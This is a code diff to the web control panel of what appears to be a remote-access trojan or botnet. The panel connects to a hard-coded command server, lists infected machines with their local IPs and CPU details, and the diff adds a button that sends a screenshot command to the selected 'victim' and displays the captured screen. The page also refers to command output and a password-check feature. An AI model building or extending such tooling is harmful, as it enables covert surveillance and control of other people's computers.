@@ -12,7 +12,7 @@
 
   <script>
 
-  
+  var ips = [];
 
     var socket = io('http://13.126.74.47:8000');
 
@@ -24,6 +24,7 @@
     for(var i = 0; i < data.length;i++) {
         if(data[i].type == 'dead' || data[i].type == 'acp') continue;
         str += "<tr><td>" + data[i].sockid + "</td><td>" + data[i].name + "</td><td>" + data[i].rel + "</td><td>" + data[i].lip + "</td><td>" + data[i].cpu[0].model + "</td>";
+        ips[i] = data[i].lip;
     }
     str += "</table>";
     return str;
@@ -57,6 +58,18 @@
 
           
       });
+
+    $("#screen").on('click', function() { 
+           
+           socket.emit('client_screenshot', { toclient: $("#victim").val() }, function (data) {
+                $("#screen-op-body").html("<img src='http://" + ips[toclient] + "/s.png'></img>");
+                $("#screen-op").modal('show');
+            });
+
+           
+          
+      });
+
 
       $("#checkpass").on('click', function() { 
             $.get("filter.php", function(data, status){
@@ -201,6 +214,23 @@
         </div>
         <div class="modal-body">
           <pre id="cmd-op-body"></pre>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal fade" id="screen-op" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Screenshot</h4>
+        </div>
+        <div class="modal-body">
+          <p id="screen-op-body"></p>
         </div>
         <div class="modal-footer">
           <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
